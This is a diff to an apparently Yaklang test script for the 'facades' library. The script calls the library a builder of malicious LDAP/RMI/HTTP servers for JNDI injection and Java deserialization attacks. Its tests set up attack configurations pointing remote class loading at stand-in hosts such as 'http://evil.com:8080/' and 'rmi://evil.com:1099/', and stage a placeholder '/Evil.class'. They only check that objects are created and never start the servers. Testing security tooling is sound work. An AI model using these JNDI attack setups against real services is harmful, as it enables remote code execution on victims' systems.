@@ -1,50 +1,375 @@
-// Facades库核心功能测试 - 门面服务器
-// 关键词: facades, 门面服务器, LDAP, RMI, HTTP
+/*
+Yaklang facades (门面服务器) 库实践
 
-// Facades库基础功能验证
-assert facades.NewFacadeServer != undefined, "NewFacadeServer函数应存在"
-assert facades.Serve != undefined, "Serve函数应存在"
-assert facades.javaClassName != undefined, "javaClassName函数应存在"
-assert facades.javaCodeBase != undefined, "javaCodeBase函数应存在"
-assert facades.objectClass != undefined, "objectClass函数应存在"
-assert facades.javaFactory != undefined, "javaFactory函数应存在"
-assert facades.httpResource != undefined, "httpResource函数应存在"
-assert facades.ldapResourceAddr != undefined, "ldapResourceAddr函数应存在"
-assert facades.rmiResourceAddr != undefined, "rmiResourceAddr函数应存在"
-assert facades.evilClassResource != undefined, "evilClassResource函数应存在"
+facades库用于创建恶意门面服务器，支持LDAP、RMI、HTTP等多种协议。
+主要用于Java反序列化漏洞利用，可以快速搭建攻击服务器，适用于JNDI注入、反序列化测试等场景。
 
-// 1. 基本函数存在性验证
-assert typeof(facades.NewFacadeServer) == "function", "NewFacadeServer应为函数类型"
-assert typeof(facades.Serve) == "function", "Serve应为函数类型"
+关键词: 门面服务器, Java反序列化, LDAP服务器, RMI服务器
+关键词: facades.NewFacadeServer, JNDI注入, 恶意类加载
+*/
 
-// 2. 配置函数存在性验证
-configFunctions = [
-    facades.javaClassName,
-    facades.javaCodeBase,
-    facades.objectClass,
-    facades.javaFactory,
-    facades.httpResource,
-    facades.ldapResourceAddr,
-    facades.rmiResourceAddr,
-    facades.evilClassResource,
-]
-
-for fn in configFunctions {
-    assert typeof(fn) == "function", "配置函数应为函数类型"
+// 测试NewFacadeServer函数
+// 关键词: facades.NewFacadeServer, 服务器创建
+func testNewFacadeServer() {
+    log.info("测试NewFacadeServer函数")
+    
+    // 验证函数存在
+    assert facades.NewFacadeServer != undefined, "NewFacadeServer函数应存在"
+    assert typeof(facades.NewFacadeServer) == "function", "应为函数类型"
+    
+    // 创建服务器实例（不启动）
+    // 关键词: 服务器实例, 主机端口配置
+    testHost = "127.0.0.1"
+    testPort = 18389  // 使用非标准端口避免冲突
+    
+    server = facades.NewFacadeServer(testHost, testPort)
+    assert server != nil, "服务器实例不应为空"
+    
+    log.info(f"服务器实例创建成功: ${testHost}:${testPort}")
 }
 
-// 3. 模拟服务器创建（仅为演示，不实际启动）
-// server = facades.NewFacadeServer("127.0.0.1", 1389)
-// assert server != nil, "服务器实例应成功创建"
+// 测试Serve函数
+// 关键词: facades.Serve, 服务启动
+func testServeFunction() {
+    log.info("测试Serve函数")
+    
+    // 验证Serve函数存在
+    assert facades.Serve != undefined, "Serve函数应存在"
+    assert typeof(facades.Serve) == "function", "Serve应为函数类型"
+    
+    log.info("Serve函数验证成功")
+    
+    // 注意：实际启动服务器需要在goroutine中运行，且需要外部环境
+    // go fn { facades.Serve(host, port) }
+}
 
-// 4. 函数签名验证
-// 验证函数是否可以被赋值给变量
-newServerFunc = facades.NewFacadeServer
-serveFunc = facades.Serve
+// 测试javaClassName配置
+// 关键词: facades.javaClassName, Java类名配置
+func testJavaClassNameConfig() {
+    log.info("测试javaClassName配置")
+    
+    // 验证配置函数存在
+    assert facades.javaClassName != undefined, "javaClassName函数应存在"
+    assert typeof(facades.javaClassName) == "function", "应为函数类型"
+    
+    // 创建配置项
+    // 关键词: Java类名, 恶意类配置
+    className = "EvilClass"
+    configOption = facades.javaClassName(className)
+    assert configOption != nil, "配置选项不应为空"
+    
+    log.info(f"Java类名配置创建成功: ${className}")
+}
 
-assert dyn.IsYakFunc(newServerFunc) == true, "NewFacadeServer应为可调用的Yak函数"
-assert dyn.IsYakFunc(serveFunc) == true, "Serve应为可调用的Yak函数"
+// 测试javaCodeBase配置
+// 关键词: facades.javaCodeBase, 代码库URL, 远程类加载
+func testJavaCodeBaseConfig() {
+    log.info("测试javaCodeBase配置")
+    
+    assert facades.javaCodeBase != undefined, "javaCodeBase函数应存在"
+    assert typeof(facades.javaCodeBase) == "function", "应为函数类型"
+    
+    // 创建CodeBase配置
+    // 关键词: CodeBase配置, 远程加载地址
+    codeBaseURL = "http://evil.com:8080/"
+    configOption = facades.javaCodeBase(codeBaseURL)
+    assert configOption != nil, "配置选项不应为空"
+    
+    log.info(f"CodeBase配置创建成功: ${codeBaseURL}")
+}
 
-// Facades库核心功能验证完成
-// 注意：由于facades库会启动网络服务器，功能性测试可能与环境冲突。
-// 本测试仅验证库函数在Yaklang中的存在性和基本类型。
+// 测试objectClass配置
+// 关键词: facades.objectClass, JNDI对象类型
+func testObjectClassConfig() {
+    log.info("测试objectClass配置")
+    
+    assert facades.objectClass != undefined, "objectClass函数应存在"
+    assert typeof(facades.objectClass) == "function", "应为函数类型"
+    
+    // 创建对象类型配置
+    // 关键词: 对象类型, JNDI引用类型
+    objClass = "javaNamingReference"
+    configOption = facades.objectClass(objClass)
+    assert configOption != nil, "配置选项不应为空"
+    
+    log.info(f"ObjectClass配置创建成功: ${objClass}")
+}
+
+// 测试javaFactory配置
+// 关键词: facades.javaFactory, 工厂类名
+func testJavaFactoryConfig() {
+    log.info("测试javaFactory配置")
+    
+    assert facades.javaFactory != undefined, "javaFactory函数应存在"
+    assert typeof(facades.javaFactory) == "function", "应为函数类型"
+    
+    // 创建工厂类配置
+    // 关键词: 工厂类, ObjectFactory
+    factoryName = "EvilFactory"
+    configOption = facades.javaFactory(factoryName)
+    assert configOption != nil, "配置选项不应为空"
+    
+    log.info(f"Factory配置创建成功: ${factoryName}")
+}
+
+// 测试httpResource配置
+// 关键词: facades.httpResource, HTTP资源, 恶意类文件
+func testHttpResourceConfig() {
+    log.info("测试httpResource配置")
+    
+    assert facades.httpResource != undefined, "httpResource函数应存在"
+    assert typeof(facades.httpResource) == "function", "应为函数类型"
+    
+    // 创建HTTP资源配置
+    // 关键词: HTTP资源, class文件托管
+    resourcePath = "/EvilClass.class"
+    resourceData = []byte{0xCA, 0xFE, 0xBA, 0xBE}  // Java class魔数
+    configOption = facades.httpResource(resourcePath, resourceData)
+    assert configOption != nil, "配置选项不应为空"
+    
+    log.info(f"HTTP资源配置创建成功: ${resourcePath}")
+}
+
+// 测试ldapResourceAddr配置
+// 关键词: facades.ldapResourceAddr, LDAP地址配置
+func testLdapResourceAddrConfig() {
+    log.info("测试ldapResourceAddr配置")
+    
+    assert facades.ldapResourceAddr != undefined, "ldapResourceAddr函数应存在"
+    assert typeof(facades.ldapResourceAddr) == "function", "应为函数类型"
+    
+    // 创建LDAP地址配置（需要name和addr两个参数）
+    // 关键词: LDAP地址, JNDI查询地址
+    ldapName = "EvilLdap"
+    ldapAddr = "ldap://127.0.0.1:1389/"
+    configOption = facades.ldapResourceAddr(ldapName, ldapAddr)
+    assert configOption != nil, "配置选项不应为空"
+    
+    log.info(f"LDAP地址配置创建成功: ${ldapName} -> ${ldapAddr}")
+}
+
+// 测试rmiResourceAddr配置
+// 关键词: facades.rmiResourceAddr, RMI地址配置
+func testRmiResourceAddrConfig() {
+    log.info("测试rmiResourceAddr配置")
+    
+    assert facades.rmiResourceAddr != undefined, "rmiResourceAddr函数应存在"
+    assert typeof(facades.rmiResourceAddr) == "function", "应为函数类型"
+    
+    // 创建RMI地址配置（需要name和addr两个参数）
+    // 关键词: RMI地址, RMI Registry
+    rmiName = "EvilRmi"
+    rmiAddr = "rmi://127.0.0.1:1099/"
+    configOption = facades.rmiResourceAddr(rmiName, rmiAddr)
+    assert configOption != nil, "配置选项不应为空"
+    
+    log.info(f"RMI地址配置创建成功: ${rmiName} -> ${rmiAddr}")
+}
+
+// 测试evilClassResource配置
+// 关键词: facades.evilClassResource, 恶意类资源
+func testEvilClassResourceConfig() {
+    log.info("测试evilClassResource配置")
+    
+    assert facades.evilClassResource != undefined, "evilClassResource函数应存在"
+    assert typeof(facades.evilClassResource) == "function", "应为函数类型"
+    
+    // 注意：evilClassResource是rmiResourceAddr的别名
+    log.info("evilClassResource函数验证成功（rmiResourceAddr的别名）")
+}
+
+// 测试完整配置场景
+// 关键词: 配置组合, 服务器配置, JNDI攻击链
+func testCompleteConfiguration() {
+    log.info("测试完整配置场景")
+    
+    // 模拟创建一个完整配置的门面服务器（不实际启动）
+    // 关键词: 完整攻击链, 服务器配置
+    
+    host = "127.0.0.1"
+    port = 18389
+    
+    // 1. 创建服务器实例
+    server = facades.NewFacadeServer(host, port)
+    assert server != nil, "服务器实例应创建成功"
+    log.info("步骤1: 服务器实例创建")
+    
+    // 2. 准备配置选项
+    className = "yakit_exec"
+    codeBase = f"http://${host}:8080/"
+    factory = "EvilFactory"
+    objClass = "javaNamingReference"
+    
+    // 创建配置选项
+    opt1 = facades.javaClassName(className)
+    opt2 = facades.javaCodeBase(codeBase)
+    opt3 = facades.javaFactory(factory)
+    opt4 = facades.objectClass(objClass)
+    
+    assert opt1 != nil, "javaClassName配置应成功"
+    assert opt2 != nil, "javaCodeBase配置应成功"
+    assert opt3 != nil, "javaFactory配置应成功"
+    assert opt4 != nil, "objectClass配置应成功"
+    
+    log.info("步骤2: 配置选项创建")
+    log.info(f"  - Java类名: ${className}")
+    log.info(f"  - CodeBase: ${codeBase}")
+    log.info(f"  - Factory: ${factory}")
+    log.info(f"  - ObjectClass: ${objClass}")
+    
+    // 3. 准备HTTP资源
+    classBytes = []byte{
+        0xCA, 0xFE, 0xBA, 0xBE,  // Java class魔数
+        0x00, 0x00, 0x00, 0x34,  // 版本号
+    }
+    resourceOpt = facades.httpResource(f"/${factory}.class", classBytes)
+    assert resourceOpt != nil, "HTTP资源配置应成功"
+    
+    log.info("步骤3: HTTP资源配置")
+    log.info(f"  - 资源路径: /${factory}.class")
+    log.info(f"  - 资源大小: ${len(classBytes)}字节")
+    
+    log.info("完整配置场景验证成功")
+}
+
+// 测试典型使用场景
+// 关键词: 使用场景, LDAP注入, JNDI攻击
+func testTypicalUsageScenario() {
+    log.info("测试典型使用场景")
+    
+    // 场景1: LDAP注入攻击服务器配置
+    // 关键词: LDAP攻击, 注入利用
+    log.info("场景1: LDAP注入攻击服务器")
+    
+    ldapServer = facades.NewFacadeServer("0.0.0.0", 11389)
+    assert ldapServer != nil, "LDAP服务器实例应创建成功"
+    
+    ldapConfig1 = facades.javaClassName("yakit_ldap")
+    ldapConfig2 = facades.javaCodeBase("http://evil.com:8080/")
+    ldapConfig3 = facades.objectClass("javaNamingReference")
+    
+    assert ldapConfig1 != nil && ldapConfig2 != nil && ldapConfig3 != nil, "LDAP配置应全部成功"
+    log.info("LDAP注入服务器配置完成")
+    
+    // 场景2: RMI注入攻击服务器配置
+    // 关键词: RMI攻击, Registry利用
+    log.info("场景2: RMI注入攻击服务器")
+    
+    rmiServer = facades.NewFacadeServer("0.0.0.0", 11099)
+    assert rmiServer != nil, "RMI服务器实例应创建成功"
+    
+    rmiConfig1 = facades.javaClassName("yakit_rmi")
+    rmiConfig2 = facades.rmiResourceAddr("EvilRmi", "rmi://evil.com:1099/")
+    
+    assert rmiConfig1 != nil && rmiConfig2 != nil, "RMI配置应全部成功"
+    log.info("RMI注入服务器配置完成")
+    
+    // 场景3: HTTP恶意类托管
+    // 关键词: HTTP托管, class文件服务
+    log.info("场景3: HTTP恶意类托管")
+    
+    httpServer = facades.NewFacadeServer("0.0.0.0", 18080)
+    assert httpServer != nil, "HTTP服务器实例应创建成功"
+    
+    evilClass = []byte{0xCA, 0xFE, 0xBA, 0xBE}  // 简化的class文件
+    httpConfig = facades.httpResource("/Evil.class", evilClass)
+    
+    assert httpConfig != nil, "HTTP资源配置应成功"
+    log.info("HTTP恶意类托管配置完成")
+    
+    log.info("所有典型使用场景验证完成")
+}
+
+// 测试配置函数类型
+// 关键词: 函数类型验证, API一致性
+func testConfigurationFunctionTypes() {
+    log.info("测试配置函数类型")
+    
+    // 验证所有配置函数都是可调用的函数
+    // 关键词: 函数验证, 类型检查
+    
+    // 逐个验证配置函数
+    assert facades.javaClassName != undefined, "javaClassName不应为undefined"
+    assert typeof(facades.javaClassName) == "function", "javaClassName应为函数类型"
+    log.info("  ✓ javaClassName: function")
+    
+    assert facades.javaCodeBase != undefined, "javaCodeBase不应为undefined"
+    assert typeof(facades.javaCodeBase) == "function", "javaCodeBase应为函数类型"
+    log.info("  ✓ javaCodeBase: function")
+    
+    assert facades.objectClass != undefined, "objectClass不应为undefined"
+    assert typeof(facades.objectClass) == "function", "objectClass应为函数类型"
+    log.info("  ✓ objectClass: function")
+    
+    assert facades.javaFactory != undefined, "javaFactory不应为undefined"
+    assert typeof(facades.javaFactory) == "function", "javaFactory应为函数类型"
+    log.info("  ✓ javaFactory: function")
+    
+    assert facades.httpResource != undefined, "httpResource不应为undefined"
+    assert typeof(facades.httpResource) == "function", "httpResource应为函数类型"
+    log.info("  ✓ httpResource: function")
+    
+    assert facades.ldapResourceAddr != undefined, "ldapResourceAddr不应为undefined"
+    assert typeof(facades.ldapResourceAddr) == "function", "ldapResourceAddr应为函数类型"
+    log.info("  ✓ ldapResourceAddr: function")
+    
+    assert facades.rmiResourceAddr != undefined, "rmiResourceAddr不应为undefined"
+    assert typeof(facades.rmiResourceAddr) == "function", "rmiResourceAddr应为函数类型"
+    log.info("  ✓ rmiResourceAddr: function")
+    
+    assert facades.evilClassResource != undefined, "evilClassResource不应为undefined"
+    assert typeof(facades.evilClassResource) == "function", "evilClassResource应为函数类型"
+    log.info("  ✓ evilClassResource: function")
+    
+    log.info("共验证8个配置函数，全部通过")
+}
+
+// 测试端口范围
+// 关键词: 端口配置, 网络端口
+func testPortRange() {
+    log.info("测试端口范围配置")
+    
+    // 测试不同端口范围的服务器创建
+    // 关键词: 端口范围, 高端口号
+    testPorts = [10389, 11099, 18080, 20000]
+    
+    for port in testPorts {
+        server = facades.NewFacadeServer("127.0.0.1", port)
+        assert server != nil, f"端口${port}的服务器应创建成功"
+        log.info(f"  ✓ 端口 ${port}: 服务器创建成功")
+    }
+    
+    log.info(f"端口范围测试完成，共测试${len(testPorts)}个端口")
+}
+
+// 执行所有Facades测试
+func main() {
+    log.info("开始Yaklang facades库功能测试")
+    
+    // 基础功能测试
+    testNewFacadeServer()
+    testServeFunction()
+    
+    // 配置函数测试
+    testJavaClassNameConfig()
+    testJavaCodeBaseConfig()
+    testObjectClassConfig()
+    testJavaFactoryConfig()
+    testHttpResourceConfig()
+    testLdapResourceAddrConfig()
+    testRmiResourceAddrConfig()
+    testEvilClassResourceConfig()
+    
+    // 综合场景测试
+    testCompleteConfiguration()
+    testTypicalUsageScenario()
+    testConfigurationFunctionTypes()
+    testPortRange()
+    
+    log.info("facades库功能测试完成")
+    log.info("facades库提供了强大的门面服务器能力，适用于Java反序列化漏洞利用、JNDI注入测试等场景")
+    log.info("注意：实际使用时需要在独立进程或goroutine中启动服务器，避免阻塞主程序")
+}
+
+// 执行主函数
+main()
